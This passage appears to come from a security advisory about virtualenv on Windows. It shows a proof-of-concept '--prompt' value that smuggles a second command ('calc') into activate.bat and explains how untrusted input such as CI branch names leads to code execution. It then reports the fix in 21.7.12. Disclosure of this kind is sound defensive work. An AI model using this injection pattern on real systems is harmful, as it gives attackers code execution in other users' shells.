$ virtualenv --prompt 'x" & calc & "' venv
$ venv\Scripts\activate.bat
```

runs `calc` the moment someone activates the environment. Confirmed on a real Windows runner. Anyone who templates a prompt from untrusted input (a CI job using a branch name, a wrapper script deriving an environment name from user input) hands an attacker code execution in the shell of anyone who activates the resulting venv on Windows.

Fixed in 21.7.12 by escaping the characters cmd.exe treats as live syntax inside this construct. Fix: https://github.com/pypa/virtualenv/pull/3250
